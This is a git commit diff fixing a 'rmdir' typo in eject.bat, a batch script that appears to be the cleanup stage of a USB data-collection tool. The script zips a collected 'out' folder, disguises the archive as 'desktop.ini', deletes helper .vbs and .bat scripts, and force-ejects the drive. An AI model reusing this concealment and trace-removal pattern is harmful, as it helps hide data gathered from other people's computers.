a993e33a76fbdba728a1e4dd0de990acdcabed85
SnowyOwl <49002319+Th3SnowyOwl@users.noreply.github.com>
2022-08-04 15:22:40 -0400

    Update eject.bat

--- eject.bat
+++ eject.bat
@@ -1,6 +1,6 @@
 powershell Compress-Archive -Path %CD:~0,2%\out -DestinationPath %CD:~0,2%\out.zip
 rename out.zip desktop.ini
-mrdir out /s /q
+rmdir out /s /q
 del *.vbs
 del nay.bat
 RemoveDrive.exe %CD:~0,2% -L -F
